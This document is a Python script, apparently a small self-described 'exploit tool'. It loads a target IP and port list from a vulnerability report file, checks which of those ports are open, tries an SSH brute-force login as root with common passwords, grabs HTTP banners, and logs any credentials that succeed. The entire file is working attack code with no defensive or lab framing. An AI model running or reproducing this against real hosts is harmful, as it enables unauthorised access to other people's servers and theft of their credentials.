import socket
import paramiko
from scapy.all import *
import requests
import json
import logging
import re

# Configure logging
logging.basicConfig(filename="exploit_tool.log", level=logging.INFO, 
                    format="%(asctime)s - %(levelname)s - %(message)s")

# File path to vulnerability report
file_path = r'E:\detroit\vulnerability_report.log'
json_content = []

# Read the file and capture only the first valid JSON block
with open(file_path, 'r') as file:
    is_json_block = False  # Track JSON block start and end
    for line in file:
        # Detect the start of a JSON block
        if line.strip().startswith("{") and not is_json_block:
            is_json_block = True

        # Capture JSON lines if we're inside a JSON block
        if is_json_block:
            # Replace single quotes with double quotes to ensure valid JSON
            line = re.sub(r"(?<!\")'(\w+)'(?!\")", r'"\1"', line)
            json_content.append(line)

            # End JSON block on finding a closing brace
            if line.strip().endswith("}"):
                break

# Join lines to form the JSON string
cleaned_json_str = "\n".join(json_content)

# Attempt to parse the cleaned JSON content
try:
    report = json.loads(cleaned_json_str)
except json.JSONDecodeError as e:
    logging.error(f"Failed to parse JSON data: {e}")
    raise SystemExit("Invalid JSON format in vulnerability report file.")

# Extract target information if JSON parsing succeeded
target_ip = report.get("target_ip", "Unknown")
open_ports = report.get("open_ports", [])
os_detected = report.get("os_detected", "Unknown")

# Define core functions for scanning, brute-forcing, and banner grabbing
def scan_port(ip, port):
    """Scan if a specific port is open."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            return result == 0
    except Exception as e:
        logging.error(f"Error scanning port {port}: {e}")
        return False

def brute_force_ssh(ip, port, username, password_list):
    """Attempt to brute-force SSH login with a list of passwords."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            client.connect(ip, port=port, username=username, password=password)
            logging.info(f"SSH login successful: {username}:{password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            continue  # Try next password
        except Exception as e:
            logging.error(f"SSH error: {e}")
            break
    return False

def http_banner_grab(ip, port):
    """Grab the HTTP banner of a server."""
    url = f"http://{ip}:{port}/" if port == 80 else f"https://{ip}:{port}/"
    try:
        response = requests.get(url, timeout=3)
        logging.info(f"HTTP banner on port {port}: {response.headers}")
        return response.headers
    except requests.RequestException as e:
        logging.error(f"Error grabbing HTTP banner: {e}")
        return None

# Attack Execution
logging.info(f"Starting exploit tool for target {target_ip}")

# Port Scanning and Action based on service
for port in open_ports:
    # Check if port is open
    if scan_port(target_ip, port):
        logging.info(f"Port {port} is open on {target_ip}")

        # SSH brute-force if SSH port (22) is open
        if port == 22:
            logging.info("Attempting SSH brute-force attack")
            username = "root"
            password_list = ["password", "123456", "root", "admin"]
            if brute_force_ssh(target_ip, 22, username, password_list):
                logging.info("SSH brute-force successful.")
            else:
                logging.info("SSH brute-force failed.")

        # HTTP Banner Grabbing if HTTP/HTTPS ports (80/443) are open
        elif port in [80, 443]:
            logging.info(f"Attempting HTTP banner grab on port {port}")
            banner = http_banner_grab(target_ip, port)
            if banner:
                logging.info(f"HTTP banner received: {banner}")

# Log completion
logging.info("Exploit attempts completed.")
print("Exploit tool initialized and completed successfully. Check exploit_tool.log for details.")
